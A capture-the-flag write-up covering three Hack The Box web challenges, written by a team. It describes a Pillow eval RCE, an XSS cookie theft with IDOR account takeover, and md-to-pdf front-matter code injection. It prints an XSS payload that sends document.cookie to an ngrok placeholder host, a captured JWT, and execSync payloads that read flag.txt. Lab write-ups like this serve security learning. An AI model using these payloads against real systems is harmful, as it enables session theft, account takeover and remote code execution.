# web

## Amidst Us
> Solved by : thewhiteh4t, Starry-Lord, Taz34, Avantika, Legend

![](https://i.imgur.com/r7mbpDi.png)

The downloadable files gives us a few clues in the files in requirements.txt and util.py:

* It’s a python environment
* It uses a vulnerable version of the python Pillow library

![](https://i.imgur.com/oeEjFBA.png)

https://github.com/python-pillow/Pillow/pull/5923

link: [python-pillow/Pillow#5923](https://github.com/python-pillow/Pillow/pull/5923)

This exchange provided some great insights on how to trigger SSRF

In util.py we find eval is being used on the data provided in the POST request, which allows us to upload a random image with background rgb parameters.

After a couple trial and errors we managed to grab the flag.txt and send it to our webhook by replacing one of the RGB values of “background”:

![](https://i.imgur.com/8kemcYF.png)

```
HTB{i_slept_my_way_to_rce}
```

----------

## Krpytos Support
> Solved By : thewhiteh4t

In this one we land on a support page where we can send a POST request, it also contains a backend button which takes us to a login page…

first I thought its a cookie stealing challenge so I send the following payload : 

```html
<img src=x onerror=this.src='<NGROK-LINK-HERE>/?'+document.cookie;>
```

and I got a JWT : 

```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI1MzQ4ODV9.JO12yEA44QxXgfUmL3n6Sm4Et2AJc5rkvXkvSMdmFOI
```

decoded :

```
{
  "username": "moderator",
  "uid": 100,
  "iat": 1652534885
}
```

and I got two interesting things here, now the cookie did not work for login for some reason so I went back to enum and found an API endpoint :

```
/api/users/update
```

using XHR I sent the following request to change the password :

![](https://i.imgur.com/mVy9Zs9.png)

logged in with the new password :

![](https://i.imgur.com/lkqwQPZ.png)

but moderator doesn’t have the flag so I had to escalate to admin…

using the same payload above I just changed the `uid` from 100 to 1 and logged in again, I could have got it one go but well… 

![](https://i.imgur.com/JI1lO3O.png)

----------

## Blinker fluid
> Solved By : Bobbysox, Legend, Starrylord, thewhiteh4t

In blinker fluid challenge our markdown input gets converted into a PDF file available for download.

in the site source we checked `package.json` file :

```json
{
        "name": "blinker-fluids",
        "version": "1.0.0",
        "description": "",
        "main": "index.js",
        "scripts": {
                "start": "node index.js"
        },
        "keywords": [],
        "author": "rayhan0x01",
        "license": "ISC",
        "dependencies": {
                "express": "^4.17.3",
                "md-to-pdf": "^4.1.0",
                "nunjucks": "3.2.3",
                "sqlite-async": "1.1.3",
                "uuid": "8.3.2"
        },
        "devDependencies": {
                "nodemon": "^1.19.1"
        }
}
```

interesting things in this file are : 

```
"md-to-pdf": "^4.1.0"
"nunjucks": "3.2.3"
```

we quickly found the following CVE for `md-to-pdf` : 

https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880

payload as shown in the link : 

```
---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE
```

the payload did not work for us as it is so we looked for more info on the same and found this : 

https://github.com/11ty/eleventy/issues/1208


[11ty/eleventy#1208](https://github.com/11ty/eleventy/issues/1208)

so basically nunjucks was having issues with single line payload so we settled on the following : 

```
---js
((require("child_process")).execSync("cat ../flag.txt > static/invoices/rce.txt"))
---
```

line 1 and 3 needed to be exactly as above for it to work and we redirected flag to a file in invoices directory…

```
HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
```